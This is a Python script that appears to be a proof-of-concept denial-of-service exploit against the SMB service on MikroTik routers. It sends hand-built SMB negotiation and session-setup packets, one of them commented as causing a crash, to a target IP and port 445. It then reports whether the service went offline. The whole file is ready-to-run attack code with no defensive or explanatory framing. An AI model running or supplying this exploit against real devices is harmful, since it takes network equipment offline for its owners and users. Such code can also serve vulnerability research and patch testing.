import argparse
from time import sleep
from socket import socket

smb_negotiation_request = b'\x00\x00\x00\xd4\xff\x53\x4d\x42\x72\x00\x00\x00' \
                          b'\x00\x18\x43\xc8\x00\x00\x00\x00\x00\x00\x00\x00' \
                          b'\x00\x00\x00\x00\x00\x00\xfe\xff\x00\x00\x00\x00' \
                          b'\x00\xb1\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f' \
                          b'\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31' \
                          b'\x2e\x30\x00\x02\x4d\x49\x43\x52\x4f\x53\x4f\x46' \
                          b'\x54\x20\x4e\x45\x54\x57\x4f\x52\x4b\x53\x20\x31' \
                          b'\x2e\x30\x33\x00\x02\x4d\x49\x43\x52\x4f\x53\x4f' \
                          b'\x46\x54\x20\x4e\x45\x54\x57\x4f\x52\x4b\x53\x20' \
                          b'\x33\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31' \
                          b'\x2e\x30\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30' \
                          b'\x32\x00\x02\x44\x4f\x53\x20\x4c\x41\x4e\x4d\x41' \
                          b'\x4e\x32\x2e\x31\x00\x02\x4c\x41\x4e\x4d\x41\x4e' \
                          b'\x32\x2e\x31\x00\x02\x53\x61\x6d\x62\x61\x00\x02' \
                          b'\x4e\x54\x20\x4c\x41\x4e\x4d\x41\x4e\x20\x31\x2e' \
                          b'\x30\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31' \
                          b'\x32\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32' \
                          b'\x00\x02\x53\x4d\x42\x20\x32\x2e\x3f\x3f\x3f\x00'

smb_service_setup_request = b'\x00\x00\x00\xb8\xfe\x53\x4d\x42\xff\x00\x00\x00\x00\x00\x00\x00' \
                            b'\x01\x00\xf1\x1f\x00\x00\x00\x00\x00\x00\x00\x00'
smb_service_setup_request += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # Message ID
smb_service_setup_request += b'\x00\x00\x00\x00'  # process id
smb_service_setup_request += b'\x00\x00\x00\x00'  # tree id
smb_service_setup_request += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # session id -> 0 == crash
smb_service_setup_request += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
smb_service_setup_request += b'\x19\x00'  # StructureSize
smb_service_setup_request += b'\x00\x01'  # SecurityMode
smb_service_setup_request += b'\x01\x00\x00\x00\x00\x00\x00\x00' \
                             b'\x58\x00\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa1\x5e\x30\x5c' \
                             b'\xa2\x5a\x04\x58\x4e\x54\x4c\x4d\x53\x53\x50\x00\x03\x00\x00\x00' \
                             b'\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00' \
                             b'\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00' \
                             b'\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00' \
                             b'\x15\x8a\x00\x02\x06\x01\x00\x00\x00\x00\x00\x0f\x01\x01\x63\x25' \
                             b'\x01\xc5\x27\xb1\x52\xad\xe8\x8c\x7a\xe5\x06\xdd'


def smb_dos(ip, port):
    msg = "ok" if _send_dos(ip, port) else "system offline"
    return f"[dos]: {msg}"


def _send_dos(ip, port):
    try:
        s = socket()
        s.connect((ip, port))
        for pkt in [smb_negotiation_request, smb_service_setup_request]:
            s.send(pkt)
            sleep(0.01)
    except ConnectionRefusedError:
        return False
    return True


def service_status(ip, port):
    status = "online" if _check_connection(ip, port) else "offline"
    return f"[smb]: {status}"


def _check_connection(ip, port):
    sleep(0.5)
    try:
        s = socket()
        s.connect((ip, port))
        return True
    except ConnectionRefusedError:
        return False


def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument("--ip", type=str, required=True, help="IP to MikroTik router")
    p.add_argument("--port", type=int, default=445, help="IP to MikroTik router")
    return p.parse_args()


if __name__ == "__main__":
    opts = parse_args()

    print(service_status(opts.ip, opts.port))
    print(smb_dos(opts.ip, opts.port))
    print(service_status(opts.ip, opts.port))
